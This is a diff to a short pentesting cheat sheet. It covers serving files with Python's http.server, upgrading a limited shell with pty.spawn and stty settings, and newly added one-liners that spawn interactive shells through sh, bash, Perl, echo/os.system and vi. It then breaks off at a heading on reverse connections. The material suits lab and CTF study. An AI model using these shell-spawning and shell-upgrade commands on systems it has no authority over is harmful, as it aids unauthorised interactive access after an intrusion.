@@ -8,7 +8,7 @@ To open a sever on specific IP we use -- bind
 For ex- python -m http.server port --bind <IP> 
 If this doesnt work use python2 version.
 
-# For Requesting a Interactive Shell in Python
+# For Requesting a Interactive Shells
 python -c 'import pty; pty.spawn("/bin/bash")'
 This will upgrade a dumb shell to an interactive one
 If this doesnt work for you then try doing this step wise\ 
@@ -24,6 +24,22 @@ $ reset\
 $ export SHELL=bash\
 $ export TERM=xterm-256color\
 $ stty rows <num> columns <cols>
+
+**For Echo**\
+echo 'os.system('/bin/bash')'\
+
+**sh**\
+/bin/sh -i\
+
+**bash**\
+/bin/bash -i\
+
+**Perl**\
+perl -e 'exec "/bin/sh";'\
+
+**From within VI**\
+:!bash
+
   
 # THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER
 **THIS IS USED FOR REVERSE CONNECTIONS.\
